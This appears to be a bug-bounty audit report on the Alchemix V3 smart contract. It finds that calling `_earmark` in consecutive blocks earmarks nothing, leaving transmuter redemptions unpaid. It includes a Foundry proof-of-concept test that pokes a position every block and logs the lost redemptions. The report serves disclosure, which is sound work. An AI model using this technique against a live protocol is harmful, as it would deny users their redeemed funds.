# 58564 sc critical earmarked funds fail to accumulate when earmark is called in consecutive blocks

**Submitted on Nov 3rd 2025 at 09:22:11 UTC by @SOPROBRO for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58564
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Permanent freezing of unclaimed yield
  * Smart contract unable to operate due to lack of token funds

## Description

## Brief/Intro

When `_earmark` is called in consecutive blocks, the `queryGraph` interval becomes zero-length, causing no funds to be earmarked. As a result, transmuter redemptions are never paid and users debt won't be repaid.

## Vulnerability Details

The function `_earmark` calculates the amount to earmark using:

```solidity
uint256 amount = ITransmuter(transmuter).queryGraph(lastEarmarkBlock + 1, block.number);
```

At the end of `_earmark`, it sets

```solidity
lastEarmarkBlock = block.number;
```

If `_earmark` is called in **consecutive blocks** (e.g., due to the permissionless `poke` function or frequent protocol activity via `withdraw`, `mint`, `burn`, `repay`, `redeem`), then:

* `lastEarmarkBlock + 1 == block.number`
* `queryGraph` returns `0` for a zero-length interval
* No new funds are earmarked, preventing transmutation progress and debt repayment.

### Example scenario (using poke)

1. A user deposits and mints `alAsset` at block `0`, setting `lastEarmarkBlock = 0`.
2. At block `1`, a user calls `poke()`.
   * `_earmark` computes `queryGraph(0 + 1, 1) → 0`.
   * `lastEarmarkBlock` is updated to `1`.
3. If this continues each block, `amount` always equals `0`, causing earmarked funds to never accumulate.

## Impact Details

Because transmuter redemptions depend on earmarked debt, this behaviour leads to:

* Users receiving **no funds upon redemption**.
* The protocol failing to automatically repay debt.

This issue can occur naturally due to normal transaction flow, not just via malicious spam.

## Recommendation

Add a guard to skip execution when the block interval is zero:

```solidity
if (block.number <= lastEarmarkBlock + 1) return;
```

This ensures that `_earmark` only runs when there has been at least one full block of accumulation.

## Proof of Concept

## Proof Of Concept

In `AlchemistV3.t.sol`, in the setup function `deployCoreContracts`, change the `timeToTransmute` from `5_256_000` to `5000` (This is just for testing purposes, as if we attempt to poke `5_256_000`) times in the test, it will result in a OOG error.

```diff
ITransmuter.TransmuterInitializationParams memory transParams = ITransmuter.TransmuterInitializationParams({
	syntheticToken: address(alToken),
	feeReceiver: address(this),
-	timeToTransmute: 5_256_000,
+	timeToTransmute: 5000,
	transmutationFee: 10,
	exitFee: 20,
	graphSize: 52_560_000
});
```

Then, add the following test, and run in the console `forge test --mt test_loss_of_redeemed_funds_when_poking_every_block -vv`. Feel free to change the value of `rollAmount` to see how the amount of consecutive `_earmarked` calls affects the amounts earmarked and redeemed.

```solidity
function test_loss_of_redeemed_funds_when_poking_every_block() external {
	uint256 amount = 100e18;
	vm.startPrank(address(0xbeef));
	uint256 startingUserMYT = IERC20(address(vault)).balanceOf(address(0xbeef));
	SafeERC20.safeApprove(address(vault), address(alchemist), amount + 100e18);
	alchemist.deposit(amount, address(0xbeef), 0);
	// a single position nft would have been minted to 0xbeef
	uint256 tokenIdFor0xBeef = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));

	alchemist.mint(tokenIdFor0xBeef, (amount / 2), address(0xbeef));
	vm.stopPrank();

	vm.startPrank(address(0xdad));
	SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 50e18);
	transmuterLogic.createRedemption(50e18);
	vm.stopPrank();
	uint256 rollAmount = 5000;
	for (uint256 i; i < rollAmount; i++) {
		alchemist.poke(tokenIdFor0xBeef);
		vm.roll(block.number + 1);
	}
	vm.roll(block.number + 5000 - rollAmount);

	(uint256 deposited, uint256 userDebt, uint256 earmarked) = alchemist.getCDP(tokenIdFor0xBeef);
	console.log("Deposited funds before claim %e", deposited);
	console.log("User debt before claim %e", userDebt);
	console.log("Earmarked debt before claim %e", earmarked);
	uint256 startingBalanceOfRedeemer = IERC20(address(vault)).balanceOf(address(0xdad));

	vm.startPrank(address(0xdad));
	transmuterLogic.claimRedemption(1);
	uint256 endingBalanceOfRedeemer = IERC20(address(vault)).balanceOf(address(0xdad));

	console.log("Balance redeemed : %e",endingBalanceOfRedeemer - startingBalanceOfRedeemer);
	vm.stopPrank();

	(deposited, userDebt, earmarked) = alchemist.getCDP(tokenIdFor0xBeef);

	console.log("Deposited funds after claim %e", deposited);
	console.log("User debt after claim %e", userDebt);
	console.log("Earmarked debt after claim %e", earmarked);

	vm.startPrank(address(0xbeef));
	TokenUtils.safeApprove(address(vault), address(alchemist), userDebt);
	if (userDebt > 0) {
		alchemist.repay(userDebt, tokenIdFor0xBeef);
	}
	alchemist.withdraw(deposited, address(0xbeef), tokenIdFor0xBeef);
	uint256 endingUserMYT = IERC20(address(vault)).balanceOf(address(0xbeef));
	console.log("Change in MYT user %e", startingUserMYT - endingUserMYT);
}
```

## Logs

We can clearly see that calling `_earmarked` consecutively results in a linearly loss of funds redeemed.

```md
When `rollAmount = 0`
Balance redeemed : 4.995e19


When `rollAmount = 2500` (half of all blocks _earmarked is called)
Balance redeemed : 2.498499e19

When `rollAmount = 5000` (every block _earmarked is called)
Balance redeemed : 0
```
